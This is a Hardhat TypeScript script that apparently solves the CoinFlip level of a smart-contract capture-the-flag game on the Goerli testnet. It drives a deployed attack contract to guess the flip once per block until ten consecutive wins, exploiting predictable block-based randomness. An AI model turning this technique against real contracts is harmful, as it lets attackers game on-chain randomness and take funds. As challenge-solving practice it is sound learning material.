import { ethers } from "hardhat"
import { setTimeout } from "timers/promises";

async function main() {

const challengeContractAddress = "0x201EE3C5270d9BA470457efaD5b584Af744331Fc"
const challengeContract = await ethers.getContractAt("CoinFlip", challengeContractAddress)
const attackContract = await ethers.getContractAt("CoinFlipAttack", "0xFe8C49004864470eD905bc1947fdFEeBF939939a")
let currentWins = 0
let lastHash = 0
while(currentWins < 10){
    const blockHash = (await ethers.provider.getBlock("latest"))!.timestamp
    if(lastHash == blockHash){
        console.log("waiting for next block...")
        await setTimeout(5000) // wait 5 seconds
        continue
    }
    lastHash=blockHash
    const tx = await attackContract.guessFlip(challengeContractAddress)
    const receipt = await tx.wait()
    console.log("guess completed, hash: ", receipt.hash)
    currentWins = Number(await challengeContract.consecutiveWins())
    console.log("CurrentWins: ", currentWins)
    if(currentWins==0){
        console.log("guess was wrong, exiting loop")
        break
    }
  }
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error)
    process.exit(1)
  })

// Deployed with: `forge create CoinFlipAttack --private-key $PKEY --rpc-url $RPC_URL`
// Tested against a hardhat fork with `pnpm hardhat node --fork $RPC_URL`
// Hardhat test is run with: `pnpm hardhat trun script/3CoinFlip.ts --network goerli --no-compile`
// TODO: Did not run yet as hardhat network config is being dumb and not working